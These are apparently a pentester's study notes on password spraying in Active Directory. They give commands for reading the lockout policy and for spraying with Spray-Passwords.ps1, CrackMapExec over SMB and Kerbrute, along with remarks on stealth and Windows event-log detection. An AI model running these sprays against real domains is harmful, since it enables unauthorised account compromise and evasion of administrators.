public:: true

- In case you already have access to a domain user, use it to grab a list of [valid](((655b6438-8ebc-46f6-a345-059d33f3ad83))) domain [users](((655b6438-2cff-4396-b2d2-a9cf0077d0bb))). This will be very helpful with the following commands.
- Before brute-forcing any domain account we always better check what the *lockout policy* looks like.
  id:: 655c7f48-d435-469c-ac3d-7bb4a56c888e
	- From a shell of a domain user we can use `net` as follow:
	  ```cmd
	  net accounts
	  ```
	  ```cmd
	  C:\Users\jeff> net accounts
	  Force user logoff how long after time expires?:       Never
	  Minimum password age (days):                          1
	  Maximum password age (days):                          42
	  Minimum password length:                              7
	  Length of password history maintained:                24
	  Lockout threshold:                                    5
	  Lockout duration (minutes):                           30
	  Lockout observation window (minutes):                 30
	  Computer role:                                        WORKSTATION
	  The command completed successfully.
	  ```
	- #+BEGIN_CAUTION
	  Too many failed logins may **block the account** for further attacks and possibly **alert system administrators**.
	  #+END_CAUTION
- Password Spray
	- [`Spray-Passwords.ps1`](https://github.com/michele-dedonno/MDD-scripts/blob/master/Spray-Passwords.ps1)
	  logseq.order-list-type:: number
	  It automatically identifies domain users and sprays a password against them according to the [lockout policy](((655c7f48-d435-469c-ac3d-7bb4a56c888e))).
		- This script uses the [`DirectoryEntry`](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.directoryentry?view=dotnet-plat-ext-6.0) constructor to brute-force accounts
		  ```powershell
		  New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $username, $password)
		  ```
		- Usage examples
			- `.\Spray-Passwords.ps1 -Pass 'Summer2016'`
			- `.\Spray-Passwords.ps1 -Pass 'Summer2016,Password123' -Admins`
			- `.\Spray-Passwords.ps1 -File .\passwords.txt -Verbose`
			- `.\Spray-Passwords.ps1 -Url 'https://raw.githubusercontent.com/improsec/Get-bADpasswords/master/Accessible/PasswordLists/weak-passwords-common.txt' -Verbose`
	- [[CrackMapExec]]
	  logseq.order-list-type:: number
		- Iterate through a list of users and try to authenticate against a specified SMB server using a fixed password.
		  ```powershell
		  crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
		  ```
		- #+BEGIN_WARNING
		  Brute-forcing accounts via the SMB protocol have some drawbacks.
		  #+END_WARNING
			- For every authentication attempt a full SMB connection has to be set up and then terminated.
			  logseq.order-list-type:: number
			- It is very noisy due to the generated network traffic.
			  logseq.order-list-type:: number
			- It is also quite slow in comparison to other techniques.
			  logseq.order-list-type:: number
	- [[Kerbrute]]
	  logseq.order-list-type:: number
	  id:: 6564d528-89dd-4b10-95af-7f4c863afa06
		- #+BEGIN_NOTE
		  The main advantage is that it **only uses two UDP frames** to determine whether the password is valid as it only sends an [AS_REQ](((655b1c01-e1e1-4be0-b245-ff8c9482df38))) and examines the response, making it the faster online brute-force technique.
		  
		  It's also *kinda stealthier* than other methods since **pre-authentication failures do not trigger** "*An account failed to log on*" (event [4625](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4625)). However, the [KDC](((655a4269-4fa1-4988-b577-ad77f90064c0))) will log every failed pre-authentication attempt (event [4768](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4768)) by increasing the *badpwdcount* attribute for any incorrect `PA-ENC-TIMESTAMP` attempts.
		  
		  A lot of 4768 events for different users may **point to a user enumeration attack** attempt.
		  #+END_NOTE
		- Iterate through a list of users and file [AS-REQ](((655b1c01-e1e1-4be0-b245-ff8c9482df38)))s to the domain controller using a fixed password.
		  ```bash
		  kerbrute_linux_amd64 passwordspray -d corp.com .\usernames.txt "Nexus123!"
		  ```
		- TODO check if the following hypothesis is correct
		  background-color:: pink
			- We know that for retro-compatibility all AS-REQ are [first tried without pre-authentication](((655b158a-a666-41e0-8076-e59942a7bb20))). Wouldn't all these legit requests pollute the event logs?
			  Of course, in case of enumeration or password spray there would be many 4768 events within a small timeframe, therefore it won't be trivial to tune a detection rule for such scenarios. But how that would perform in a highly dense AD?